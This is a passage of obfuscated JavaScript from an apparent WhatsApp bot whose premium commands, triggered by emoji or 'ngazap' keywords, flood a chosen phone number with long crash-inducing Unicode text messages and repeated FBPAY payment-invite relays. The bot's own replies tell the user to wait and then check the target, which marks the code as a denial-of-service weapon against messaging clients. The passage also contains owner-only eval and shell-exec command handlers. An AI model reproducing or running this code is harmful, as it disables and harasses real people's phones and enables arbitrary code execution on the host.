            'text': "ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛̘𞋬𞋬𞋬𞋬𞋬𞋬𞋬"
          }, {
            'quoted': _0x1db8d8
          });
          await sleep(0x1f4);
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {
            'participant': {
              'jid': Pe
            }
          });
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': 'FBPAY',
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x5265c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x141dd76000
            }
          }, {
            'participant': {
              'jid': Pe
            }
          });
          sleep(0x1f4);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4279c5(Pe, _0x1559ff);
          await _0x5cc5cf(Pe, _0x1db8d8);
          await _0x2f63f7(Pe, _0x1db8d8);
          await _0x8861df(Pe);
          await _0x26a059(Pe);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x1a7d5e(Pe);
          await _0x5cc5cf(Pe, _0x1db8d8);
          await _0x2f63f7(Pe, _0x1db8d8);
          await _0x8861df(Pe);
          await _0x26a059(Pe);
          await _0x32d24f(Pe);
          _0x4fb13b.sendMessage(Pe, {
            'text': 'ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛̘𞋬𞋬𞋬𞋬𞋬𞋬𞋬'
          }, {
            'quoted': _0x1db8d8
          });
          await sleep(0x1f4);
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': 'FBPAY',
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {
            'participant': {
              'jid': Pe
            }
          });
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': 'FBPAY',
              'expiryTimestamp': Date.now() + 0x5265c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x141dd76000
            }
          }, {
            'participant': {
              'jid': Pe
            }
          });
          sleep(0x1f4);
        }
        await _0x4fb13b.sendMessage(Pe, {
          'react': {
            'text': '✅',
            'key': {
              'remoteJid': _0x2decff.chat,
              'fromMe': true,
              'id': _0x12833a.id
            }
          }
        });
        break;
      case '🌷':
      case '🌹':
      case '🥀':
      case '💐':
      case '🌼':
      case "🏵️":
      case '🌺':
      case '🌻':
      case '🌸':
      case '🪷':
        if (!_0x5a1564) {
          return _0x303a92(global.spesialprem);
        }
        if (!q) {
          return _0x303a92("Contoh:\n " + (_0x23c579 + _0xce55e7) + " 628xxx");
        }
        Pe = _0x2decff.mentionedJid[0x0] ? _0x2decff.mentionedJid[0x0] : _0x2decff.quoted ? _0x2decff.quoted.sender : q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        _0x303a92("`[ # ] DIKA ID` \ntunggu 1-3menit lalu cek target!");
        for (let _0x5a2fd3 = 0x0; _0x5a2fd3 < 0x3; _0x5a2fd3++) {
          await _0x8861df(Pe);
          await _0x8861df(Pe);
          await _0x8861df(Pe);
          await _0x8861df(Pe);
          await _0x8861df(Pe);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {
            'participant': {
              'jid': Pe
            }
          });
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x5265c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': 'FBPAY',
              'expiryTimestamp': Date.now() + 0x141dd76000
            }
          }, {
            'participant': {
              'jid': Pe
            }
          });
          sleep(0x1f4);
          await _0x8861df(Pe);
          await _0x8861df(Pe);
          await _0x8861df(Pe);
          await _0x8861df(Pe);
          await _0x8861df(Pe);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {
            'participant': {
              'jid': Pe
            }
          });
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x5265c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x141dd76000
            }
          }, {
            'participant': {
              'jid': Pe
            }
          });
          sleep(0x1f4);
          await _0x8861df(Pe);
          await _0x8861df(Pe);
          await _0x8861df(Pe);
          await _0x8861df(Pe);
          await _0x8861df(Pe);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {
            'participant': {
              'jid': Pe
            }
          });
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': 'FBPAY',
              'expiryTimestamp': Date.now() + 0x5265c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x141dd76000
            }
          }, {
            'participant': {
              'jid': Pe
            }
          });
          sleep(0x1f4);
          await _0x8861df(Pe);
          await _0x8861df(Pe);
          await _0x8861df(Pe);
          await _0x8861df(Pe);
          await _0x8861df(Pe);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': 'FBPAY',
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {
            'participant': {
              'jid': Pe
            }
          });
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x5265c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': 'FBPAY',
              'expiryTimestamp': Date.now() + 0x141dd76000
            }
          }, {
            'participant': {
              'jid': Pe
            }
          });
          sleep(0x1f4);
        }
        await _0x4fb13b.sendMessage(Pe, {
          'react': {
            'text': '✅',
            'key': {
              'remoteJid': _0x2decff.chat,
              'fromMe': true,
              'id': _0x12833a.id
            }
          }
        });
        break;
      case 'ngazap-v1':
      case "ngazap-v2":
      case "ngazap-v3":
      case "ngazap-v4":
      case "ngazap-v5":
      case '😻':
      case '😆':
      case '😂':
        if (!_0x5a1564) {
          return _0x303a92(global.spesialprem);
        }
        if (!q) {
          return _0x303a92("Contoh:\n " + (_0x23c579 + _0xce55e7) + " 628xxx");
        }
        Pe = _0x2decff.mentionedJid[0x0] ? _0x2decff.mentionedJid[0x0] : _0x2decff.quoted ? _0x2decff.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x303a92("`[ # ] DIKA ID` \ntunggu 1-3menit lalu cek target!");
        for (let _0x17098b = 0x0; _0x17098b < 0x3; _0x17098b++) {
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {
            'participant': {
              'jid': Pe
            }
          });
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x5265c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x141dd76000
            }
          }, {
            'participant': {
              'jid': Pe
            }
          });
          sleep(0x1f4);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {
            'participant': {
              'jid': Pe
            }
          });
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x5265c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x141dd76000
            }
          }, {
            'participant': {
              'jid': Pe
            }
          });
          sleep(0x1f4);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': 'FBPAY',
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {
            'participant': {
              'jid': Pe
            }
          });
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': 'FBPAY',
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': 'FBPAY',
              'expiryTimestamp': Date.now() + 0x5265c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': 'FBPAY',
              'expiryTimestamp': Date.now() + 0x141dd76000
            }
          }, {
            'participant': {
              'jid': Pe
            }
          });
          sleep(0x1f4);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {
            'participant': {
              'jid': Pe
            }
          });
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x5265c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x141dd76000
            }
          }, {
            'participant': {
              'jid': Pe
            }
          });
          sleep(0x1f4);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': 'FBPAY',
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {
            'participant': {
              'jid': Pe
            }
          });
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': 'FBPAY',
              'expiryTimestamp': Date.now() + 0x5265c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x141dd76000
            }
          }, {
            'participant': {
              'jid': Pe
            }
          });
          sleep(0x1f4);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
        }
        await _0x4fb13b.sendMessage(Pe, {
          'react': {
            'text': '✅',
            'key': {
              'remoteJid': _0x2decff.chat,
              'fromMe': true,
              'id': _0x12833a.id
            }
          }
        });
        break;
      case '😼':
      case '🙀':
      case '🤪':
      case '😱':
      case '🌊':
      case '⚡':
      case '🌀':
      case '😹':
      case '😺':
      case '🌪️':
      case '💧':
        if (!_0x5a1564) {
          return _0x303a92(global.spesialprem);
        }
        if (!q) {
          return _0x303a92("Contoh:\n " + (_0x23c579 + _0xce55e7) + " 628xxx");
        }
        Pe = _0x2decff.mentionedJid[0x0] ? _0x2decff.mentionedJid[0x0] : _0x2decff.quoted ? _0x2decff.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x303a92("`[ # ] DIKA ID` \ntunggu 1-3menit lalu cek target!");
        for (let _0x1da69b = 0x0; _0x1da69b < 0x3; _0x1da69b++) {
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {
            'participant': {
              'jid': Pe
            }
          });
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': 'FBPAY',
              'expiryTimestamp': Date.now() + 0x5265c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': 'FBPAY',
              'expiryTimestamp': Date.now() + 0x141dd76000
            }
          }, {
            'participant': {
              'jid': Pe
            }
          });
          sleep(0x1f4);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {
            'participant': {
              'jid': Pe
            }
          });
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x5265c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x141dd76000
            }
          }, {
            'participant': {
              'jid': Pe
            }
          });
          sleep(0x1f4);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': 'FBPAY',
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {
            'participant': {
              'jid': Pe
            }
          });
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x6c258c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 0x5265c00
            }
          }, {});
          await _0x4fb13b.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': 'FBPAY',
              'expiryTimestamp': Date.now() + 0x141dd76000
            }
          }, {
            'participant': {
              'jid': Pe
            }
          });
          sleep(0x1f4);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
          await _0x4dcd57(Pe, _0x1db8d8);
        }
        await _0x4fb13b.sendMessage(Pe, {
          'react': {
            'text': '✅',
            'key': {
              'remoteJid': _0x2decff.chat,
              'fromMe': true,
              'id': _0x12833a.id
            }
          }
        });
        break;
      case 'blok':
      case "block":
        if (!_0x3845b7) {
          return _0x2decff.reply(global.spesialown);
        }
        if (!q) {
          return _0x303a92("Contoh:\n " + (_0x23c579 + _0xce55e7) + " 628xxx");
        }
        Pe = _0x2decff.mentionedJid[0x0] ? _0x2decff.mentionedJid[0x0] : _0x2decff.quoted ? _0x2decff.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x4fb13b.updateBlockStatus(Pe, "block");
        _0x303a92("Sukses block target");
        break;
      case "unblok":
      case "unblock":
        if (!_0x3845b7) {
          return _0x2decff.reply(global.spesialown);
        }
        if (!q) {
          return _0x303a92("Contoh:\n " + (_0x23c579 + _0xce55e7) + " 628xxx");
        }
        Pe = _0x2decff.mentionedJid[0x0] ? _0x2decff.mentionedJid[0x0] : _0x2decff.quoted ? _0x2decff.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x4fb13b.updateBlockStatus(Pe, 'unblock');
        _0x303a92("Sukses unblock target");
        break;
      case "error":
      case "failed":
        {
          _0x303a92("Hai 👋 *" + _0x2a020d + " " + _0x466a49 + "*\nJika terdapat error pada script bisa hubungi kontak dibawah ini (not spam)\nTelegram : t.me/dikabot_tech\nWhatsApp : 6283841442290");
        }
        break;
      case "cekbot":
      case "cek":
      case "cek?":
        {
          _0x303a92("Hai 👋 *" + _0x2a020d + " " + _0x466a49 + "*\n" + global.botname + " ready! jangan lupa subscribe\nYouTube : @dikaid_tech\nhttps://youtube.com/@dikaid_tech");
        }
        break;
      default:
        if (_0x16843c.startsWith('=>')) {
          if (!_0x3845b7) {
            return _0x303a92("*Only Dika Ganteng*");
          }
          try {
            _0x303a92(util.format(eval("(async () => { return " + _0x16843c.slice(0x3) + " })()")));
          } catch (_0x10d1d5) {
            _0x303a92(String(_0x10d1d5));
          }
        }
        if (_0x16843c.startsWith('>')) {
          if (!_0x3845b7) {
            return;
          }
          try {
            let _0x329ac2 = await eval(_0x16843c.slice(0x2));
            if (typeof _0x329ac2 !== 'string') {
              _0x329ac2 = require("util").inspect(_0x329ac2);
            }
            await _0x303a92(_0x329ac2);
          } catch (_0x5d017a) {
            await _0x303a92(String(_0x5d017a));
          }
        }
        if (_0x16843c.startsWith('$')) {
          if (!_0x3845b7) {
            return;
          }
          require("child_process").exec(_0x16843c.slice(0x2), (_0x377701, _0x3bffb8) => {
            if (_0x377701) {
              return _0x303a92('' + _0x377701);
            }
            if (_0x3bffb8) {
              return _0x303a92(_0x3bffb8);
            }
          });
        }
    }
  } catch (_0x59b800) {
    _0x4fb13b.sendMessage(_0x2decff.chat, {
      'text': require("util").format(_0x59b800)
